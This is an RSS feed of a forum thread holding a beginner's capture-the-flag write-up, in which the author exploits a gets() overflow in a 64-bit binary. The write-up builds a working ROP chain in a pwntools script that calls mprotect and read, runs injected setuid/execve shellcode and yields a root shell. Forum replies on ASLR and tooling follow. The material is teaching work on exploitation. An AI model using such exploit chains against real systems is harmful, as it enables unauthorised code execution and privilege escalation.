<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>64-bit ROP | You rule &#39;em all!</title>
    <link>https://0x00sec.org/t/64-bit-rop-you-rule-em-all/1937</link>
    <description>### Solving a ROP on 64-bit challenge :grinning:

In the name of Allah, the most beneficent, the most merciful.



----------
###Before i begin this article, i want to thank @_py for showing me this beautiful community :yum:.. 


- This article is for learning purposes... :)
- Hello everybody, this my first article ever, i&#39;m not really good at explaining things.. But still, i will try making everything clear for you..
- So in this task we were given a binary, and its source code.. So the first thing is that we should identify the bug, and try to do something with it..
- Also one thing to keep in mind, the binary does read our input and print it in hexadecimal.

The following lines seem interesting..
```c
char buffer[256];
gets(buffer);
```

So we have an array named buffer, which size is 256.
and then comes a call to gets();

&gt; gets() reads a line from stdin into the buffer pointed to by s until either a terminating newline or EOF, which it replaces with a null byte (aq\0aq).

https://linux.die.net/man/3/gets

uhm, so it will read from stdin, until it gets newline. &quot;\x0a&quot;

Seems just perfect. so it will take our input, and stores it in buffer, one question that comes to our mind now...
What if the size of our input was &gt; sizeof(buffer);

&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/b/b21c8591e3150488218f1e3c0bd1f96f0e55ff23.png&quot; width=&quot;690&quot; height=&quot;85&quot;&gt;

- The answer is that we&#39;ll overwrite the value of saved RIP.

mean that we control the flow of the program..

Let&#39;s try that in the real challenge now..

Let&#39;s first download the binary..

&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/a/ab6e395b666a1a342f3167b8f194a4213519e178.png&quot; width=&quot;690&quot; height=&quot;207&quot;&gt;

Then let&#39;s try to do what we talked about, making the size of input bigger than the size of the array:

&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/d/d4b602a20b809d21c04df0a23b3685c3bfffc9c2.png&quot; width=&quot;690&quot; height=&quot;160&quot;&gt;

Interesting, we got Segmentation fault, which is actually a signal..
&gt; In computing, a segmentation fault (often shortened to segfault) or access violation is a fault, or failure condition, raised by hardware with memory protection, notifying an operating system (OS) the software has attempted to access a restricted area of memory (a memory access violation).

So we can deduce that the RIP pointed to 0x41414141 and tried reading the instuction from that invalid address leading into this..

Awesome! but the question now, is what pad should we use till we reach the RIP saved address.. what we should do is decrementing till it exits normally and add one, that&#39;s the perfect padding..

&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/c/c538d09948896aeb60154aee619bd2ef36a48f39.png&quot; width=&quot;690&quot; height=&quot;269&quot;&gt;

Seems good, so the perfect pad to saved RIP is 280!
let&#39;s make sure it&#39;s the right pad..

&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/a/a5232793128dcbd6c2d873a3ece38d5db06f9422.png&quot; width=&quot;677&quot; height=&quot;91&quot;&gt;
&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/e/e006e89d361c0e3af0ca40cd7d183f039eda0421.png&quot; width=&quot;309&quot; height=&quot;57&quot;&gt;
And that&#39;s just what we were looking for.. Perfect!

Now what to do? we got control over RIP, what&#39;s next?

The next thing is to find gadgets, that&#39;ll help us get shell in some way..

To do this, you can use multiple tools, i use Ropper! a really great tool to search for gadgets ending with a ret; so it just won&#39;t exit, instead, calls the following address.

This challenge, has the following protections on:
`FULL RELRO
NX
ASLR`

But, we have a more powerful thing, is that we have control over RIP.. and we got alot of gadgets, since the binary is statically linked..

So now, we should make a plan for the attack..
what can we do to get a shell?

The first thing that comes to mind, is making an area in memory [executable, writeable, readable] (RWX), and put shellcode into it, and simply return to it..

To do this, we first got to understand the usage of some functions, like mprotect(), and read()..

&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/3/3a0ff54d4f4627ea930b31383b6558fede053b1d.png&quot; width=&quot;408&quot; height=&quot;195&quot;&gt;

&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/0/0c75847799ded4eae24fa97180f728b4c6506701.png&quot; width=&quot;404&quot; height=&quot;126&quot;&gt;

And we can see that both function, take 3 arguments.. And make use of them!

So let&#39;s see the binary, and write what we will be doing!

&gt; 1ST : mprotect() an area, making it RWX!
&gt; 2ND :  read() our shellcode from stdin ( fd = 0 ) into the area we made executable.
&gt; 3RD : return to the area.

So let&#39;s look for a good address to make it&#39;s permissions RWX!

- We&#39;ll be using vmmap in gdb-peda to see the areas.
&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/9/9a60f5f5f0abedb102fe1e72947af5aeab9d298f.png&quot; width=&quot;673&quot; height=&quot;204&quot;&gt;

Uhmm!

- We&#39;ll choose 0x6bf000 !

So our usage of mprotect() will be like the following:
`mprotect(0x6bf000(*addr), 0x100(len), PROT_READ|PROT_WRITE|PROT_EXEC(prot));`
And our usage of read():
`read(stdin(fd=0), 0x6bf000(*buf), 0x100(len));`

Now, what gadgets can help us invoke the following calls?

We&#39;ll use ropper to get the gadgets!
https://github.com/sashs/Ropper
Let&#39;s try and use ropper!

&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/d/d4374f8214658316284049caa7d957a33edb260f.png&quot; width=&quot;667&quot; height=&quot;68&quot;&gt;

&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/a/ac787f32dbeff2bf4eb25e54461294bfb9f2014f.png&quot; width=&quot;642&quot; height=&quot;56&quot;&gt;

And that will give you all gadgets, will take some time to load..

let&#39;s find the gadgets that interests us!

syscall; ret; ( invoking the syscall )
&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/3/3dcbde4b22e4a5774d4fd305e2d339605ddbf27e.png&quot; width=&quot;330&quot; height=&quot;25&quot;&gt;
pop rax; ret; ( syscall number )
&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/5/5306c9a4e67539e0097a98823e9974a68eb0db06.png&quot; width=&quot;307&quot; height=&quot;21&quot;&gt;
pop rdi; ret; ( 1st argument )
&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/c/cd1b57b7e80c79e1f4f2c99d6be474f75418044b.png&quot; width=&quot;316&quot; height=&quot;24&quot;&gt;
pop rsi; ret; ( 2nd argument )
&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/1/14531bf4c66d7088355e6819e7454285ff315e99.png&quot; width=&quot;313&quot; height=&quot;24&quot;&gt;
pop rdx; ret; ( 3rd argument )
&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/b/b309f8bd02f0c21d97ef806c4743a6d196a18c82.png&quot; width=&quot;301&quot; height=&quot;25&quot;&gt;

So now we have the gadgets, enough to invoke a call!

We will also make use of this table:

https://filippo.io/linux-syscall-table/

And we get syscall numbers for read() and mprotect()

&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/c/c80729e255c8255aab15ad42b060e7322d75c38b.png&quot; width=&quot;690&quot; height=&quot;392&quot;&gt;

- So for mprotect() we should set RAX to 0xa and for read() RAX should be set to 0x0

Now we&#39;ve reached a part, where a problem becomes obvious. 0xa, is a newline char, sending it will corrupt our payload..
So we gotta find another way to control RAX, zeroing it out, using xor, and then increment it using add!

Gadgets that&#39;ll help us do this:
xor rax with itself, resulting in RAX = 0; and ret;
&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/e/e447c84c20d3e363ed7af02dc261123626b82702.png&quot; width=&quot;351&quot; height=&quot;20&quot;&gt;
increment RAX!
&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/2/2c4ab09dc2f9f309d82139acc47d65926c46a05a.png&quot; width=&quot;332&quot; height=&quot;23&quot;&gt;

So now to making the exploit we&#39;ll start with putting what we already know there:

```python
#!/usr/bin/python
from pwn import *

c = process(&quot;./ch34&quot;)

# GADGETS
xorrax = 0x41bd9f
incrax = 0x45aa10
poprdi = 0x4016d3
poprsi = 0x4017e7
poprdx = 0x437205
syscall = 0x45b525
# ADDR
buf = 0x6bf000
# SYSCALL NUMS
mprotect = 0xa
read = 0x0

# EXPLOIT
payload = &quot;A&quot; * 280

# SENDING
c.sendline(payload)
c.interactive()
```

If we pop a register then the next address will be assigned to it as a value..

So let&#39;s try to make use of the gadgets we found!
we&#39;ll only modify the # EXPLOIT section in the exploit..

```python
# EXPLOIT
payload = &quot;A&quot; * 280
payload += p64(xorrax) # SET RAX = 0
payload += p64(incrax) * 10 # SET RAX = 10
```

&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/9/95446560f87db043c09f0488d49e352fe27a4316.png&quot; width=&quot;151&quot; height=&quot;29&quot;&gt;

And it worked! we can now continue with other registers!

&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/c/c9583aa6058ed368f3a48b533c55e30c4da7a703.png&quot; width=&quot;610&quot; height=&quot;340&quot;&gt;

```python
# EXPLOIT
payload = &quot;A&quot; * 280
payload += p64(xorrax) # SET RAX = 0
payload += p64(incrax) * 10 # SET RAX = 10
payload += p64(poprdi) # 1ST ARGUMENT
payload += p64(buf) # ADDRESS
payload += p64(poprsi) # 2ND ARGUMENT
payload += p64(0x100) # SIZE
payload += p64(poprdx) # 3RD ARGUMENT
payload += p64(0x7) # RWX
payload += p64(syscall) # SYSCALL
```

Let&#39;s try and see now, if our area is executable! :smiley: 

&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/c/cd55c51b93759c4fe3f023549a46fe9cafcfa527.png&quot; width=&quot;675&quot; height=&quot;21&quot;&gt;

That&#39;s awesome! the area have now RWX permissions!

What do we need to do now?
We need to read the shellcode from stdin and place it in the executable area!

```python
# EXPLOIT
payload = &quot;A&quot; * 280
payload += p64(xorrax) # SET RAX = 0
payload += p64(incrax) * 10 # SET RAX = 10
payload += p64(poprdi) # 1ST ARGUMENT
payload += p64(buf) # ADDRESS
payload += p64(poprsi) # 2ND ARGUMENT
payload += p64(0x100) # SIZE
payload += p64(poprdx) # 3RD ARGUMENT
payload += p64(0x7) # RWX
payload += p64(syscall) # SYSCALL
payload += p64(xorrax) # SET RAX = 0
payload += p64(poprdi) # 1ST ARGUMENT
payload += p64(0x0) # STDIN
payload += p64(poprsi) # 2ND ARGUMENT
payload += p64(buf) # ADDRESS
payload += p64(poprdx) # 3RD ARGUMENT
payload += p64(0x100) # SIZE
payload += p64(syscall) # SYSCALL
```

And that will be enough to invoke a mprotect() to make the area executable and then read() shellcode from stdin ( fd = 0 ) but still we didn&#39;t do one thing, is returning to shellcode!

To do it, we need to add one line! remember it&#39;s syscall; ret;
So we need to add:
&gt; payload += p64(buf)

And also, since it&#39;ll read the shellcode from stdin, we&#39;ll add a variable named shellcode containing a x86_64 shellcode..
and send it right after:
```python
c.sendline(payload)
c.sendline(shellcode)
```
- And i think that&#39;s enough to come with a shell!

Time to try!

&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/3/3d38ca9b64de8abef9b35ae5c6fe4fc695881ada.png&quot; width=&quot;690&quot; height=&quot;260&quot;&gt;

And we successfully got our lovely shell!
to exploit now on remote, and i&#39;m a windows user... we got to take our payload and change it&#39;s form..

- Write payload to a file and take it out of my VM...
- Write a little php script to make it in the form i want..

```php
&lt;?php
error_reporting(0);
$c = file_get_contents(&#39;payload&#39;);
for($i = 0; $i &lt; strlen($c); $i++){
$a = $c[$i];
$h = base_convert(ord($a), 10, 16);
if(strlen($h) &lt; 2){
$p = &quot;0&quot;;
}else{
$p = &quot;&quot;;
}
$n .= &quot;\x&quot;.$p.$h;
}
print $n;
?&gt;
```

And that will give us the payload in the following form:
&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/d/ddb391f79e9dc64ace5b8debf52e6cc573d5dc0d.png&quot; width=&quot;690&quot; height=&quot;21&quot;&gt;

So we can use it: (python -c &#39;print &quot;(payload here)&quot;&#39;; python -c &#39;print &quot;(shellcode here)&quot;&#39;; cat) | ./ch34

after doing so!
We failed..
We got a shell, but no root permissions!

&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/c/cf0d874ba4e6afa00e5df306b90d5fd692ff9321.png&quot; width=&quot;690&quot; height=&quot;45&quot;&gt;

What about an setuid(0); and then execve(&#39;/bin/sh&#39;); shellcode?

http://shell-storm.org/shellcode/files/shellcode-77.php
And yeah! it worked..

&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/0/0d596e0a1751e107a7406fa6f46c8b3165deeed7.png&quot; width=&quot;690&quot; height=&quot;31&quot;&gt;

We successfully exploited it using Return oriented programming!
Hope you understood well, and enjoyed reading as well!
If people like such simple articles, i&#39;ll try making more later! :D

~ exploit</description>
    
    <lastBuildDate>Thu, 16 Nov 2017 06:13:24 +0000</lastBuildDate>
    <category>Exploit Development</category>
    <atom:link href="https://0x00sec.org/t/64-bit-rop-you-rule-em-all/1937.rss" rel="self" type="application/rss+xml" />
      <item>
        <title>64-bit ROP | You rule &#39;em all!</title>
        <dc:creator><![CDATA[_py]]></dc:creator>
        <description><![CDATA[
            
          <p><a href="https://0x00sec.org/t/64-bit-rop-you-rule-em-all/1937/22">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/64-bit-rop-you-rule-em-all/1937/22</link>
        <pubDate>Thu, 16 Nov 2017 06:13:28 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1937-22</guid>
        <source url="https://0x00sec.org/t/64-bit-rop-you-rule-em-all/1937.rss">64-bit ROP | You rule &#39;em all!</source>
      </item>
      <item>
        <title>64-bit ROP | You rule &#39;em all!</title>
        <dc:creator><![CDATA[_py]]></dc:creator>
        <description><![CDATA[
            <p>Google is your friend.</p>
<p>Hint: 64-bit binary</p>
          <p><a href="https://0x00sec.org/t/64-bit-rop-you-rule-em-all/1937/21">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/64-bit-rop-you-rule-em-all/1937/21</link>
        <pubDate>Thu, 16 Nov 2017 06:13:24 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1937-21</guid>
        <source url="https://0x00sec.org/t/64-bit-rop-you-rule-em-all/1937.rss">64-bit ROP | You rule &#39;em all!</source>
      </item>
      <item>
        <title>64-bit ROP | You rule &#39;em all!</title>
        <dc:creator><![CDATA[Veer_Abhimanyu]]></dc:creator>
        <description><![CDATA[
            <p>how does the author come to know that the function mprotect takes arguements from those particular registers ( rdi ,rsi , rdx ) !!??</p>
          <p><a href="https://0x00sec.org/t/64-bit-rop-you-rule-em-all/1937/20">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/64-bit-rop-you-rule-em-all/1937/20</link>
        <pubDate>Thu, 16 Nov 2017 04:02:35 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1937-20</guid>
        <source url="https://0x00sec.org/t/64-bit-rop-you-rule-em-all/1937.rss">64-bit ROP | You rule &#39;em all!</source>
      </item>
      <item>
        <title>64-bit ROP | You rule &#39;em all!</title>
        <dc:creator><![CDATA[exploit]]></dc:creator>
        <description><![CDATA[
            <p><a class="mention" href="https://0x00sec.org/u/trickster0">@trickster0</a> Happy you learnt something <img src="https://0x00sec.org/images/emoji/twitter/smiley.png?v=9" title=":smiley:" class="emoji" alt=":smiley:">! And i’ll do my best to write about Kernel BOF once i find some freetime. <img src="https://0x00sec.org/images/emoji/twitter/smile.png?v=9" title=":smile:" class="emoji" alt=":smile:"></p>
          <p><a href="https://0x00sec.org/t/64-bit-rop-you-rule-em-all/1937/19">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/64-bit-rop-you-rule-em-all/1937/19</link>
        <pubDate>Wed, 15 Nov 2017 21:47:05 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1937-19</guid>
        <source url="https://0x00sec.org/t/64-bit-rop-you-rule-em-all/1937.rss">64-bit ROP | You rule &#39;em all!</source>
      </item>
      <item>
        <title>64-bit ROP | You rule &#39;em all!</title>
        <dc:creator><![CDATA[trickster0]]></dc:creator>
        <description><![CDATA[
            <p><a class="mention" href="https://0x00sec.org/u/exploit">@exploit</a> Hey man, i noticed that you post some great exploit dev tutorials.<br>
I have been trying to tackle the challenge from root-me about the x86 kernel bof.<br>
I would love to see a tutorial about that, to learn a few things.<br>
I am looking forward to it, if you have any time to solve it and write a couple of stuff here.<br>
thx in advance</p>
          <p><a href="https://0x00sec.org/t/64-bit-rop-you-rule-em-all/1937/18">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/64-bit-rop-you-rule-em-all/1937/18</link>
        <pubDate>Wed, 15 Nov 2017 20:49:03 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1937-18</guid>
        <source url="https://0x00sec.org/t/64-bit-rop-you-rule-em-all/1937.rss">64-bit ROP | You rule &#39;em all!</source>
      </item>
      <item>
        <title>64-bit ROP | You rule &#39;em all!</title>
        <dc:creator><![CDATA[_py]]></dc:creator>
        <description><![CDATA[
            <p>There is <strong>system</strong> ASLR where only libc’s base address is randomized and there’s also <strong>full</strong> ASLR which randomizes the address space of the binary itself (i.e gadget addresses as you mentioned), aka PIE (google gcc’s -fPIE flag).</p>
<p>In <a class="mention" href="https://0x00sec.org/u/exploit">@exploit</a>’s case, only libc’s base address was randomized and thus the gadgets had the same address in each execution since they were in the text segment area of the binary and not inside libc.</p>
          <p><a href="https://0x00sec.org/t/64-bit-rop-you-rule-em-all/1937/17">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/64-bit-rop-you-rule-em-all/1937/17</link>
        <pubDate>Wed, 15 Nov 2017 15:26:58 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1937-17</guid>
        <source url="https://0x00sec.org/t/64-bit-rop-you-rule-em-all/1937.rss">64-bit ROP | You rule &#39;em all!</source>
      </item>
      <item>
        <title>64-bit ROP | You rule &#39;em all!</title>
        <dc:creator><![CDATA[Veer_Abhimanyu]]></dc:creator>
        <description><![CDATA[
            <p>I see that ASLR is enabled using /proc/sys/kernel/randomize_va_space<br>
But my doubt is that how are the addresses of gadgets being same even after running many times ?</p>
          <p><a href="https://0x00sec.org/t/64-bit-rop-you-rule-em-all/1937/16">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/64-bit-rop-you-rule-em-all/1937/16</link>
        <pubDate>Wed, 15 Nov 2017 12:43:03 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1937-16</guid>
        <source url="https://0x00sec.org/t/64-bit-rop-you-rule-em-all/1937.rss">64-bit ROP | You rule &#39;em all!</source>
      </item>
      <item>
        <title>64-bit ROP | You rule &#39;em all!</title>
        <dc:creator><![CDATA[_py]]></dc:creator>
        <description><![CDATA[
            <p><a class="mention" href="https://0x00sec.org/u/thedoctor">@TheDoctor</a> That is more of a syntactical/formatting guideline. We’ll add further info on that one (or make a fresh one) and pin it.</p>
          <p><a href="https://0x00sec.org/t/64-bit-rop-you-rule-em-all/1937/15">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/64-bit-rop-you-rule-em-all/1937/15</link>
        <pubDate>Fri, 28 Apr 2017 15:12:46 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1937-15</guid>
        <source url="https://0x00sec.org/t/64-bit-rop-you-rule-em-all/1937.rss">64-bit ROP | You rule &#39;em all!</source>
      </item>
      <item>
        <title>64-bit ROP | You rule &#39;em all!</title>
        <dc:creator><![CDATA[TheDoctor]]></dc:creator>
        <description><![CDATA[
            <p><a class="mention" href="https://0x00sec.org/u/ricksanchez">@ricksanchez</a> <a class="mention" href="https://0x00sec.org/u/_py">@_py</a> Is <a href="https://www.0x00sec.org/t/post-coherency-and-adherence-to-good-english/503">this</a> what you mean?</p>
          <p><a href="https://0x00sec.org/t/64-bit-rop-you-rule-em-all/1937/14">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/64-bit-rop-you-rule-em-all/1937/14</link>
        <pubDate>Fri, 28 Apr 2017 15:10:00 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1937-14</guid>
        <source url="https://0x00sec.org/t/64-bit-rop-you-rule-em-all/1937.rss">64-bit ROP | You rule &#39;em all!</source>
      </item>
      <item>
        <title>64-bit ROP | You rule &#39;em all!</title>
        <dc:creator><![CDATA[exploit]]></dc:creator>
        <description><![CDATA[
            <p>Thank you guys for feedback <img src="https://0x00sec.org/images/emoji/twitter/smiley.png?v=9" title=":smiley:" class="emoji" alt=":smiley:">, I really appreciate this. Thank you guys <img src="https://0x00sec.org/images/emoji/twitter/heart.png?v=9" title=":heart:" class="emoji" alt=":heart:"> !</p>
          <p><a href="https://0x00sec.org/t/64-bit-rop-you-rule-em-all/1937/13">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/64-bit-rop-you-rule-em-all/1937/13</link>
        <pubDate>Fri, 28 Apr 2017 12:52:29 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1937-13</guid>
        <source url="https://0x00sec.org/t/64-bit-rop-you-rule-em-all/1937.rss">64-bit ROP | You rule &#39;em all!</source>
      </item>
      <item>
        <title>64-bit ROP | You rule &#39;em all!</title>
        <dc:creator><![CDATA[johnt]]></dc:creator>
        <description><![CDATA[
            <p>I meant “ropgadget --ropchain” <img src="https://0x00sec.org/images/emoji/twitter/wink.png?v=9" title=":wink:" class="emoji" alt=":wink:"></p>
          <p><a href="https://0x00sec.org/t/64-bit-rop-you-rule-em-all/1937/12">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/64-bit-rop-you-rule-em-all/1937/12</link>
        <pubDate>Fri, 28 Apr 2017 10:59:20 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1937-12</guid>
        <source url="https://0x00sec.org/t/64-bit-rop-you-rule-em-all/1937.rss">64-bit ROP | You rule &#39;em all!</source>
      </item>
      <item>
        <title>64-bit ROP | You rule &#39;em all!</title>
        <dc:creator><![CDATA[ricksanchez]]></dc:creator>
        <description><![CDATA[
            <p>He used <a href="https://github.com/sashs/Ropper">Ropper</a> which does basically the same <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
          <p><a href="https://0x00sec.org/t/64-bit-rop-you-rule-em-all/1937/11">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/64-bit-rop-you-rule-em-all/1937/11</link>
        <pubDate>Fri, 28 Apr 2017 10:57:51 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1937-11</guid>
        <source url="https://0x00sec.org/t/64-bit-rop-you-rule-em-all/1937.rss">64-bit ROP | You rule &#39;em all!</source>
      </item>
      <item>
        <title>64-bit ROP | You rule &#39;em all!</title>
        <dc:creator><![CDATA[johnt]]></dc:creator>
        <description><![CDATA[
            <p>You beat that challenge without using ROPgadget ? I respect that <img src="https://0x00sec.org/images/emoji/twitter/smiley.png?v=9" title=":smiley:" class="emoji" alt=":smiley:"></p>
          <p><a href="https://0x00sec.org/t/64-bit-rop-you-rule-em-all/1937/10">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/64-bit-rop-you-rule-em-all/1937/10</link>
        <pubDate>Fri, 28 Apr 2017 10:54:12 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1937-10</guid>
        <source url="https://0x00sec.org/t/64-bit-rop-you-rule-em-all/1937.rss">64-bit ROP | You rule &#39;em all!</source>
      </item>
      <item>
        <title>64-bit ROP | You rule &#39;em all!</title>
        <dc:creator><![CDATA[_py]]></dc:creator>
        <description><![CDATA[
            <p><a class="mention" href="https://0x00sec.org/u/oaktree">@oaktree</a> <a class="mention" href="https://0x00sec.org/u/pry0cc">@pry0cc</a> <a class="mention" href="https://0x00sec.org/u/ioth1nkn0t">@IoTh1nkN0t</a> <a class="mention" href="https://0x00sec.org/u/0x00pf">@0x00pf</a> he’s got a point.</p>
          <p><a href="https://0x00sec.org/t/64-bit-rop-you-rule-em-all/1937/9">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/64-bit-rop-you-rule-em-all/1937/9</link>
        <pubDate>Fri, 28 Apr 2017 10:53:35 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1937-9</guid>
        <source url="https://0x00sec.org/t/64-bit-rop-you-rule-em-all/1937.rss">64-bit ROP | You rule &#39;em all!</source>
      </item>
      <item>
        <title>64-bit ROP | You rule &#39;em all!</title>
        <dc:creator><![CDATA[ricksanchez]]></dc:creator>
        <description><![CDATA[
            <p><a class="mention" href="https://0x00sec.org/u/_py">@_py</a> then maybe it’s time to create a rough template or some writing guidelines and pin them to the top?</p>
          <p><a href="https://0x00sec.org/t/64-bit-rop-you-rule-em-all/1937/8">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/64-bit-rop-you-rule-em-all/1937/8</link>
        <pubDate>Fri, 28 Apr 2017 10:48:16 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1937-8</guid>
        <source url="https://0x00sec.org/t/64-bit-rop-you-rule-em-all/1937.rss">64-bit ROP | You rule &#39;em all!</source>
      </item>
      <item>
        <title>64-bit ROP | You rule &#39;em all!</title>
        <dc:creator><![CDATA[_py]]></dc:creator>
        <description><![CDATA[
            <p><a class="mention" href="https://0x00sec.org/u/ricksanchez">@ricksanchez</a> You are right on that. We don’t really need a tag, but it’d save a lot of the reader’s time if every author states at the beginning what should be expected in terms of theory etc.</p>
          <p><a href="https://0x00sec.org/t/64-bit-rop-you-rule-em-all/1937/7">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/64-bit-rop-you-rule-em-all/1937/7</link>
        <pubDate>Fri, 28 Apr 2017 10:39:04 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1937-7</guid>
        <source url="https://0x00sec.org/t/64-bit-rop-you-rule-em-all/1937.rss">64-bit ROP | You rule &#39;em all!</source>
      </item>
      <item>
        <title>64-bit ROP | You rule &#39;em all!</title>
        <dc:creator><![CDATA[ricksanchez]]></dc:creator>
        <description><![CDATA[
            <aside class="quote no-group" data-username="_py" data-post="5" data-topic="1937">
<div class="title">
<div class="quote-controls"></div>
<img alt="" width="20" height="20" src="https://0x00sec.org/user_avatar/0x00sec.org/_py/40/4275_2.png" class="avatar"> _py:</div>
<blockquote>
<p><a class="mention" href="https://0x00sec.org/u/vvid0w">@VVid0w</a> <a class="mention" href="https://0x00sec.org/u/ricksanchez">@ricksanchez</a>: Though I completely understand where you are coming from and I personally strive to always make my write-ups beginner friendly and technical at the same time, you have to see it from a different perspective as well.</p>
</blockquote>
</aside>
<p><a class="mention" href="https://0x00sec.org/u/_py">@_py</a> , you’re correct with what you’re stating about technical papers and other publications.<br>
Maybe we need something like a tag here in the forum which is either [beginner friendly] or [intermediate] for articles with “motivation for further research” as you call it. This would make writing articles for different target groups more easy ( at least visually ).<br>
But in general it was no hate against <a class="mention" href="https://0x00sec.org/u/exploit">@exploit</a> at all. He wrote a good article there’s nothing to argue about that <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"> .</p>
          <p><a href="https://0x00sec.org/t/64-bit-rop-you-rule-em-all/1937/6">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/64-bit-rop-you-rule-em-all/1937/6</link>
        <pubDate>Fri, 28 Apr 2017 10:35:05 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1937-6</guid>
        <source url="https://0x00sec.org/t/64-bit-rop-you-rule-em-all/1937.rss">64-bit ROP | You rule &#39;em all!</source>
      </item>
      <item>
        <title>64-bit ROP | You rule &#39;em all!</title>
        <dc:creator><![CDATA[_py]]></dc:creator>
        <description><![CDATA[
            <p><a class="mention" href="https://0x00sec.org/u/vvid0w">@VVid0w</a> <a class="mention" href="https://0x00sec.org/u/ricksanchez">@ricksanchez</a>: Though I completely understand where you are coming from and I personally strive to always make my write-ups beginner friendly and technical at the same time, you have to see it from a different perspective as well.</p>
<p>What you are essentially saying is that <a class="mention" href="https://0x00sec.org/u/exploit">@exploit</a> should include an english tutorial in his write-up as well (assuming that his english are perfect). I wish every technical paper had an intro section as well to get me up to speed but the truth is, it’s called technical for a reason. Imagine if every RE/Malware book included an intro to programming as well. The same applies for CVE’s.</p>
<p>Just to be clear, I completely see your points. But, there are 2 perspectives:</p>
<ul>
<li>See it as lack of information.</li>
<li>See it as motivation for further research.</li>
</ul>
<p>No hate,<br>
Peace and love.</p>
          <p><a href="https://0x00sec.org/t/64-bit-rop-you-rule-em-all/1937/5">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/64-bit-rop-you-rule-em-all/1937/5</link>
        <pubDate>Fri, 28 Apr 2017 09:57:44 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1937-5</guid>
        <source url="https://0x00sec.org/t/64-bit-rop-you-rule-em-all/1937.rss">64-bit ROP | You rule &#39;em all!</source>
      </item>
      <item>
        <title>64-bit ROP | You rule &#39;em all!</title>
        <dc:creator><![CDATA[ricksanchez]]></dc:creator>
        <description><![CDATA[
            <p><a class="mention" href="https://0x00sec.org/u/exploit">@exploit</a> really solid first article. I can agree with what <a class="mention" href="https://0x00sec.org/u/vvid0w">@VVid0w</a> said for feedback.<br>
Keep them coming. <img src="https://0x00sec.org/images/emoji/twitter/wink.png?v=9" title=":wink:" class="emoji" alt=":wink:"></p>
<p>In the end as a feedback in my own words I can say the following:<br>
I could follow this post quite well and enjoyed reading it for the most part. Just a few remarks:</p>
<ul>
<li>It felt like you wanted to make it beginner friendly and tried to explain things carefully even citing how certain functions work. That’s good! But sometimes some explanations were missing for me.<br>
